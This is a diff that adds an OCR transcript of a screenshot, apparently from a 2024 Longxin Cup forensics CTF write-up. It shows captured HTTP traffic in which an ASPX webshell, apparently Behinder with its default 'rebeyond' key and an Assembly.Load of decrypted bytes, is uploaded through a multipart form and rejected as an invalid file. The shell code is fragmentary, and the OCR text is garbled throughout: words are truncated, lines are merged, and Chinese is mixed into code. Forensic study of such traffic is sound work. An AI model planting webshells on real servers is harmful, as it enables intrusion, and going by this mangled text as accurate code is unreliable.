@@ -1,0 +1,16 @@
+# OCR: 5ed65d537982654c1d6c79fb0fd721b2.webp
+# 来源: ./02-WriteUp/2024/2024-龙信杯/5ed65d537982654c1d6c79fb0fd721b2.webp
+# 引擎: Umi-OCR 2.1.5 / PaddleOCR (config_chinese, limit_side_len=2880, multi_para)
+# 路由: chinese-or-general
+# 生成: 2026-11-03 14:23
+
+Content-Disposition:form-data;name="fil Content-Type:application/octet-stream
+<%@PageLanguage="c#"%><%@ImportNamesp 的前16位，默认连接密码rebeyond*/byte[］k= ssembly.Load(newSystem.Security.Cryptogr stance("u").Equals(this);%)
+-926850927191
+Content-Disposition: form-data; name="sub Submit
+926859927191
+HTTP/1.1 200 OK Server:nginx
+Date:Mon,05Aug202408:20:31GMT
+Content-Type:text/html;charset=UTF-8 Transfer-Encoding:chunked
+Connection:keep-alive Vary:Accept-Encoding Content-Encoding：gzip
+Invalidfile
